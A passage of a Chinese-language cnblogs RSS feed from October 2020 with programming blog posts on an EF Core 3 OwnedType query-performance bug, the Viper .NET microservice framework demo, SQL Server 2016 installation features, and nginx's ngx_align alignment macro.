&lt;p&gt;[Go语言圣经（中文版）] &lt;a href=&quot;https://books.studygolang.com/gopl-zh/&quot; target=&quot;_blank&quot;&gt;http://books.studygolang.com/gopl-zh/&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 17 Oct 2020 14:56:00 +0000</pubDate>
<dc:creator>Neo Nengrong Qu</dc:creator>
<og:description>每一种编程语言，从读一本好书开始 每一种编程语言，也从Helloworld开始 1. 环境准备 1.1 安装golang 在Ubuntu下，直接输入命令可以安装最新版本： $ sudo apt-get</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/QuLory/p/13832596.html</dc:identifier>
</item>
<item>
<title>EfCore3的OwnedType会导致Sql效率问题 - LeoLaw</title>
<link>http://www.cnblogs.com/leolaw/p/13832937.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/leolaw/p/13832937.html</guid>
<description>&lt;p&gt;最近主导了旗下某核心项目升级到EfCore3&lt;/p&gt;
&lt;p&gt;由于之前Core2升级时候也踩过不少的坑很多东西都有规划和准备,整体上还是没出太大问题&lt;/p&gt;

&lt;p&gt;但是最近突然发现efcore对于使用了ownedType的生成语句有问题&lt;/p&gt;
&lt;p&gt;查找了一下资料发现已经有人在efcore的github上开了issus了，并且还讨论的蛮多的了&lt;/p&gt;
&lt;p&gt;&lt;a title=&quot;https://github.com/dotnet/efcore/issues/18299&quot; href=&quot;https://github.com/dotnet/efcore/issues/18299&quot;&gt;https://github.com/dotnet/efcore/issues/18299&lt;/a&gt; &lt;/p&gt;

&lt;h2&gt;鉴于很多人看到一堆E文后会直接放弃，下面我简单阐述下这个问题&lt;/h2&gt;
&lt;p&gt;EfCore自2.0的时候引入了一个叫&lt;em&gt;OwnedType&lt;/em&gt;的特性，是用于完善之前EfCore1.x相比于Ef6使其少了的&lt;em&gt;ComplexType&lt;/em&gt;特性&lt;/p&gt;
&lt;p&gt;正常来说我们用Ef的时候是一个类映射到一个表，但是有时候某些表字段过多的情况下，我们可能会想整理下把一个表里某些信息放到一个子类里，但是其他信息还是在主类&lt;/p&gt;

&lt;p&gt;形如&lt;/p&gt;
&lt;pre&gt;
class Order
{
    public int Id { get; set; }
    public string Title { get; set; }
    public Address Address { get; set; }
}

class Address
{
    public string Street { get; set; }
    public string City { get; set; }
}
&lt;/pre&gt;
&lt;pre&gt;
然后DbContext里配置下  
&lt;/pre&gt;
&lt;pre&gt;
modelBuilder.Entity&amp;lt;Order&amp;gt;().OwnsOne(x =&amp;gt; x.Address);  
&lt;/pre&gt;
&lt;pre&gt;
这种情况下最理想生成的语句应该是类似  
&lt;/pre&gt;
&lt;pre&gt;
&lt;strong&gt;select Id,Title,Street,City from Orders&lt;/strong&gt;
&lt;/pre&gt;
&lt;pre&gt;
 这个样子的形式才对，然后EfCore内部再通过自己映射的形式把后面4个字段映射到Author类里的Address这个类里
&lt;/pre&gt;
&lt;pre&gt;
但是在EfCore3里他生成的语句是形如  
&lt;/pre&gt;
&lt;pre&gt;
&lt;strong&gt;SELECT o.&quot;Id&quot;, o.&quot;Title&quot;, t.&quot;Id&quot;, t.&quot;Address_City&quot;, t.&quot;Address_Street&quot;
      FROM &quot;Orders&quot; AS o
      LEFT JOIN (
          SELECT o0.&quot;Id&quot;, o0.&quot;Address_City&quot;, o0.&quot;Address_Street&quot;, o1.&quot;Id&quot; AS &quot;Id0&quot;
          FROM &quot;Orders&quot; AS o0
          INNER JOIN &quot;Orders&quot; AS o1 ON o0.&quot;Id&quot; = o1.&quot;Id&quot;
          WHERE (o0.&quot;Address_Street&quot; IS NOT NULL) OR (o0.&quot;Address_City&quot; IS NOT NULL)
      ) AS t ON o.&quot;Id&quot; = t.&quot;Id&quot;
      WHERE (t.&quot;Id&quot; IS NULL)&lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;尽管严格来说这个并不影响逻辑，但是这样子join的话对Sql的性能和效率有挺不好的负面影响&lt;/p&gt;
&lt;p&gt;就那个issus里也有人做了测试，结果下图&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://img2020.cnblogs.com/blog/658343/202010/658343-20201017224620469-395943086.png&quot;&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/658343/202010/658343-20201017224620874-1297137525.png&quot; alt=&quot;image&quot; width=&quot;933&quot; height=&quot;624&quot; title=&quot;image&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;纵坐标是每秒执行的查询数（简单理解为并发数吧）&lt;/p&gt;
&lt;p&gt;横坐标是表里有多少数据&lt;/p&gt;
&lt;p&gt;可以看到表的数据量上升之后使用了OwnedType的EfCore3会出现显著下滑（自己join自己多了）&lt;/p&gt;

&lt;p&gt;另外该问题在EfCore2的时候是没有的，就Core3才有（直觉是Core3的OwnedType被魔改了可以支持OwnsMany等的支持的时候引入的）&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;接下来就是一个好消息和一个坏消息了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;好消息是EfCore那边认可了这个问题然后当前EfCore 5 preview-3修复了这个问题&lt;/p&gt;

&lt;p&gt;坏消息是至少目前确认这个修复不会合并到EfCore3.1.x（后期会不会有变数不清楚）&lt;/p&gt;

&lt;p&gt;感觉这个蛮坑的，一般公司用的话都会是优先选用LTS，而当前的LTS就是3.1&lt;/p&gt;
&lt;p&gt;而接下来的NetCore5（含EfCore5）并不是LTS所以对于公司组织的线上采用率应该会相对较低&lt;/p&gt;
&lt;p&gt;那难道修复这个问题还要等一个目前还没规划的NetCore5.1？那是不是要等的有点儿太久了&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;最后，如果有升级EfCore3的且用了OwnedType（相当于Ef6时期的ComplexType）请谨慎评估下这个问题对你可能造成的影响&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;毕竟目前看起来，降级回去不大可能，烧香保佑下fix path能到3.1.x要么就只能指望Core5.1了&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 17 Oct 2020 14:46:00 +0000</pubDate>
<dc:creator>LeoLaw</dc:creator>
<og:description>最近主导了旗下某核心项目升级到EfCore3 由于之前Core2升级时候也踩过不少的坑很多东西都有规划和准备,整体上还是没出太大问题 但是最近突然发现efcore对于使用了ownedType的生成语句</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/leolaw/p/13832937.html</dc:identifier>
</item>
<item>
<title>net core 微服务 快速开发框架 Viper 初体验2020-10-17 - 杜燕明</title>
<link>http://www.cnblogs.com/duyanming/p/13832855.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/duyanming/p/13832855.html</guid>
<description>&lt;h2&gt;1、Viper是什么？&lt;/h2&gt;
&lt;p&gt;　　Viper 是.NET平台下的&lt;strong&gt;Anno&lt;/strong&gt;微服务框架的一个示例项目。&lt;strong&gt;入门简单&lt;/strong&gt;、&lt;strong&gt;安全&lt;/strong&gt;、&lt;strong&gt;稳定&lt;/strong&gt;、&lt;strong&gt;高可用&lt;/strong&gt;、&lt;strong&gt;全平台可监控。底层通讯可以随意切换&lt;code&gt;thrift&lt;/code&gt; &lt;code&gt;grpc&lt;/code&gt;。&lt;/strong&gt; 自带服务发现、调用链追踪、Cron 调度、限流、事件总线、CQRS 、DDD、类似MVC的开发体验，插件化开发&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;一个&lt;code&gt;不可监控&lt;/code&gt;的微服务平台是&lt;code&gt;可怕的&lt;/code&gt;&lt;/strong&gt;，出了问题&lt;strong&gt; 难以准确定位问题的根源&lt;/strong&gt;， Anno则提供了一套完整的监控体系，包括&lt;strong&gt;&lt;code&gt;链路追踪&lt;/code&gt;、&lt;code&gt;服务占用的系统资源&lt;/code&gt;、系统自身 &lt;code&gt;CPU、内存、硬盘使用率&lt;/code&gt;&lt;/strong&gt;实时可监控等等。　　&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;github:&lt;/strong&gt;&lt;br/&gt;&lt;a title=&quot;https://github.com/duyanming/Viper&quot; href=&quot;https://github.com/duyanming/Viper&quot; target=&quot;_blank&quot;&gt;https://github.com/duyanming/Viper&lt;/a&gt;&lt;br/&gt;&lt;strong&gt;文档地址:&lt;/strong&gt;&lt;br/&gt;&lt;a title=&quot;https://duyanming.github.io/&quot; href=&quot;https://duyanming.github.io/&quot; target=&quot;_blank&quot;&gt;https://duyanming.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;体验地址:&lt;/strong&gt;&lt;em&gt;（体验用户为anno 密码123456 同一时间一个用户只能在一个终端登录用户多的时候可能发生强制退出的情况，稍后登录体验）&lt;/em&gt;&lt;br/&gt;&lt;a title=&quot;http://140.143.207.244/&quot; href=&quot;http://140.143.207.244/&quot; target=&quot;_blank&quot;&gt;http://140.143.207.244/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　Viper项目采用了国产ORM&lt;strong&gt; &lt;a href=&quot;https://github.com/sunkaixuan/SqlSugar&quot; target=&quot;_blank&quot;&gt;SqlSugar&lt;/a&gt;。&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SqlSugar是一款国产ORM，除了拥有媲美原生的性能 另外还有满足各种需求的功能，简单好用一分钟就能够轻松上手。&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;2、先睹为快&lt;/h2&gt;
&lt;p&gt;　　&lt;strong&gt;体验地址是 腾讯云的一个 Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-91-generic x86_64)服务器。配置1C1G。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　2.1、服务监控&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　点击Service对应的柱状图可以切换对不同服务的监控。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016105411359-1354561791.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　&lt;strong&gt;　2.2、集群服务总览&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　总览集群内有多少个服务，下图有 &lt;strong&gt;Pms服务&lt;/strong&gt;、&lt;strong&gt;App001服务&lt;/strong&gt;、&lt;strong&gt;PlatformService服务、&lt;/strong&gt;java-Anno-Service服务 。点击 &lt;strong&gt;API详情  &lt;/strong&gt;可以查看该服务的服务能力（提供了那些API），点击 &lt;strong&gt;资源监控  &lt;/strong&gt;可以对该服务的整体资源占用做实时监控&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016111211252-640443482.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  　&lt;strong&gt;　2.3、链路追踪&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　可直观的看到集群内的每一次调用信息，&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016112006559-873228347.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　&lt;strong&gt; 单个调用详情，服务和服务之间的调用可追踪&lt;/strong&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016112155794-1070593031.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;   　&lt;strong&gt;　2.4、整个集群服务能力总览（类似WebApi的Swagger）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016112502496-1311011731.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016112536409-1468857552.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  &lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016112609857-573162782.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;    　&lt;strong&gt;　2.5、调试接口&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016112714516-881846908.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;    　&lt;strong&gt;　2.6、模拟调用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　可自由输入调用入参，查看结果。下面是 .net core 调用 java服务的例子&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202010/998152-20201016113136455-2119104853.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;重复 项目地址 文档地址，体验地址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;github:&lt;/strong&gt;&lt;br/&gt;&lt;a title=&quot;https://github.com/duyanming/Viper&quot; href=&quot;https://github.com/duyanming/Viper&quot; target=&quot;_blank&quot;&gt;https://github.com/duyanming/Viper&lt;/a&gt;&lt;br/&gt;&lt;strong&gt;文档地址:&lt;/strong&gt;&lt;br/&gt;&lt;a title=&quot;https://duyanming.github.io/&quot; href=&quot;https://duyanming.github.io/&quot; target=&quot;_blank&quot;&gt;https://duyanming.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;体验地址:&lt;/strong&gt;&lt;em&gt;（体验用户为anno 密码123456 同一时间一个用户只能在一个终端登录，用户多的时候可能发生强制退出的情况，稍后登陆体验）&lt;/em&gt;&lt;br/&gt;&lt;a title=&quot;http://140.143.207.244/&quot; href=&quot;http://140.143.207.244/&quot; target=&quot;_blank&quot;&gt;http://140.143.207.244/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;关于Viper的更多内容，随后更新。敬请关注。开源不易，感谢Star。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;github:&lt;/strong&gt;&lt;br/&gt;&lt;a title=&quot;https://github.com/duyanming/Viper&quot; href=&quot;https://github.com/duyanming/Viper&quot; target=&quot;_blank&quot;&gt;https://github.com/duyanming/Viper&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 17 Oct 2020 14:20:00 +0000</pubDate>
<dc:creator>杜燕明</dc:creator>
<og:description>1、Viper是什么？ Viper 是.NET平台下的Anno微服务框架的一个示例项目。入门简单、安全、稳定、高可用、全平台可监控。底层通讯可以随意切换thrift&amp;#160;grpc。&amp;#160;自</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/duyanming/p/13832855.html</dc:identifier>
</item>
<item>
<title>数据库SQL Server 2016“功能选择”详细说明及精简安装选择 - 故人与猫</title>
<link>http://www.cnblogs.com/Drock/p/13814928.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Drock/p/13814928.html</guid>
<description>&lt;p&gt;　　在平时大家安装数据库的时候，一般默认功能选择都会选择全选。但是前两天公司同事问我：“那么多功能为什么都能用到嘛？”顿时，我思考了一下确实没有详细了解每个功能的详细作用，于是花费一些时间将功能详细说明总结下来，那么数据库安装中哪些功能是必须的呢？&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;实例功能&lt;/strong&gt;&lt;/h2&gt;
&lt;table border=&quot;0&quot; align=&quot;left&quot;&gt;&lt;tbody readability=&quot;7.5&quot;&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;数据库引擎服务&lt;/td&gt;
&lt;td&gt;1.SQL Server 复制：包括一组技术，利用这些技术可以将一个数据库中的数据和数据库对象复制和分发到另一个数据库中，并在这些数据库之间进行同步以实现一致性。可以使用复制功能将数据分发到不同位置，并分发给通过局域网和广域网、拨号连接、无线连接和Internet 连接的远程和移动用户。&lt;br/&gt;2.R服务：包括能使用标准 T-SQL 语句与 R 语言进行集成的高级分析扩展。&lt;br/&gt;3.全文语义和搜索：包括支持全文提取的搜索引擎，用来加快文本搜索，以及加快对关键短语(很可能是标记)的语义提取和对 SQL Server 中存储的内容的相似性搜索。&lt;br/&gt;4.Data Quality Services：包括数据质量数据库对象。&lt;br/&gt;5.针对外部数据的PolyBase查询服务：包括可使用标准 T-SQL 语句真正实现跨 Hadoop 非关系数据和 SQL Server 关系数据的集成查询的 PolyBase 技术。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;Analysis Services&lt;/td&gt;
&lt;td&gt;包括 Analysis Services 以及进行联机分析处理(OLAP)和数据挖掘等操作时所需的工具。只能群集化数据库引擎服务和 Analysis Services。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;7&quot;&gt;&lt;td&gt;Reporting Services-本机&lt;/td&gt;
&lt;td&gt;包括 Reporting Services，该应用程序基于服务器，用于创建、管理报表并将报表传递到电子邮件、多种文件格式和基于 Web 的交互格式。本机模式的服务器通过 Reporting Services 组件提供所有处理和管理功能。Reporting Services 无法聚集。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;　&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;共享功能&lt;/strong&gt;&lt;/h2&gt;
&lt;table border=&quot;0&quot; align=&quot;left&quot;&gt;&lt;tbody readability=&quot;24&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;R Server（独立）&lt;/td&gt;
&lt;td&gt;包含提供并行化大数据分析、转换、建模和模型部署功能的 Microsoft R Server for Windows。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;7&quot;&gt;&lt;td&gt;Reporting Services-SharePoint&lt;/td&gt;
&lt;td&gt;包括 Reporting Services，该应用程序基于服务器，用于创建、管理报表并将报表传递到电子邮件、多种文件格式和基于 Web 的交互格式。SharePoint 集成模式集成了报表服务器与 SharePoint 产品。SharePoint 站点和库集成了报表查看和报表管理体验。Reporting Services 无法聚集。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;用于SharePoint产品的Reporting Services外接程序&lt;/td&gt;
&lt;td&gt;包括管理和用户界面组件，用来在 SharePoint 集成模式中将 SharePoint 产品与 SSRS 报表服务器集成。只需在运行 SharePoint 产品的服务器上安装该外接程序。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;数据质量客户端&lt;/td&gt;
&lt;td&gt;包括数据质量客户端对象。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;客户端工具连接&lt;/td&gt;
&lt;td&gt;包括用于在客户端和服务器之间通信的组件。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;Integration Services&lt;/td&gt;
&lt;td&gt;包括设计器、运行时和实用工具，令 Integration Services 可以实现数据存储区之间数据的移动、集成和转换。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;客户端工具向后兼容性&lt;/td&gt;
&lt;td&gt;客户端工具向后兼容性&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;客户端工具SDK&lt;/td&gt;
&lt;td&gt;包括软件开发包(其中含有程序员资源)。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;文档组件&lt;/td&gt;
&lt;td&gt;仅安装用来查看和管理 SQL Server 2016 文档的组件。默认情况下，Help Viewer 组件使用联机库。安装 SQL Server 后，你可以使用 Help Library 管理器组件将文档下载到你的本地计算机。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;Distributed Replay 控制器&lt;/td&gt;
&lt;td&gt;包括 Distributed Replay 控制器，该控制器用来安排 Distributed Replay 客户端的操作。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;Distributed Replay 客户端&lt;/td&gt;
&lt;td&gt;包括 Distributed Replay 客户端。多个 Distributed Replay 客户端可协同工作，以模拟针对某个 SQL Server 实例的工作负荷。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;SQL客户端连接SDK&lt;/td&gt;
&lt;td&gt;包括用于数据库应用程序开发的 SQL Server Native Client (ODBC / OLE DB) SDK。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;Master Data Services&lt;/td&gt;
&lt;td&gt;包括 Master Data Services，该平台将来自组织中的不同系统的数据整合为单个主数据源，以求准确无误并服务于审核目的。安装 Master Data Services 配置管理器、程序集、PowerShell 管理单元以及 Web 应用程序和服务的文件夹和文件。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;以上就是为大家总结的SQL Server 2016功能选择说明，想了解更多内容可以参考微软官方文档。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;      &lt;img src=&quot;https://img2020.cnblogs.com/blog/2096186/202010/2096186-20201014154038294-1572950911.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 其中数据库管理工具需要独立安装（Microsoft SQL Server Management Studio，简称SSMS。）SSMS安装包可在Microsoft免费下载: &lt;a href=&quot;https://docs.microsoft.com/zh-cn/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15&quot; target=&quot;_blank&quot;&gt;https://docs.microsoft.com/zh-cn/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15&lt;/a&gt;&lt;/p&gt;




</description>
<pubDate>Sat, 17 Oct 2020 14:01:00 +0000</pubDate>
<dc:creator>故人与猫</dc:creator>
<og:description>前言 在平时大家安装数据库的时候，一般默认功能选择都会选择全选。但是前两天公司同事问我：“那么多功能为什么都能用到嘛？”顿时，我思考了一下确实没有详细了解每个功能的详细作用，于是花费一些时间将功能详细</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Drock/p/13814928.html</dc:identifier>
</item>
<item>
<title>ngx_align 值对齐宏 - 小胖西瓜</title>
<link>http://www.cnblogs.com/shuqin/p/13832722.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/shuqin/p/13832722.html</guid>
<description>&lt;p&gt;ngx_align 为nginx中的一个值对齐宏。主要在需要内存申请的地方使用，为了减少在不同的 cache line 中内存而生。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot;&gt;// d 为需要对齐的
// a 为对齐宽度，必须为 2 的幂
// 返回对齐值
#define ngx_align(d, a)     (((d) + (a - 1)) &amp;amp; ~(a - 1))
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;原理简单，利用 &lt;code&gt;~(a - 1)&lt;/code&gt; 的低位全为 0。在与 &lt;code&gt;~(a - 1)&lt;/code&gt; 做 &lt;code&gt;&amp;amp;&lt;/code&gt; 操作时，低位的1被丢弃，就得到了a倍数的值（对齐）。&lt;/p&gt;
&lt;p&gt;如果使用原始值直接与 &lt;code&gt;~(a - 1)&lt;/code&gt; 做 &lt;code&gt;&amp;amp;&lt;/code&gt; 操作，那么得到的对齐值是会小于等于原始值的，这样会造成内存重叠，而期望的对齐值是一个大于等于原始值的，所以需要加上一个数来补上至对齐值这中间的差，这个数为 &lt;code&gt;(a - 1)&lt;/code&gt; ，选择这个数的原因是 &lt;code&gt;(a - 1) &amp;amp; ~(a - 1)&lt;/code&gt; 的结果为0：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1461087/202010/1461087-20201017214533682-1655327262.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 17 Oct 2020 13:48:00 +0000</pubDate>
<dc:creator>小胖西瓜</dc:creator>
<og:description>ngx_align 值对齐宏 ngx_align 为nginx中的一个值对齐宏。主要在需要内存申请的地方使用，为了减少在不同的 cache line 中内存而生。 // d 为需要对齐的 // a 为</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/shuqin/p/13832722.html</dc:identifier>
</item>
</channel>
</rss>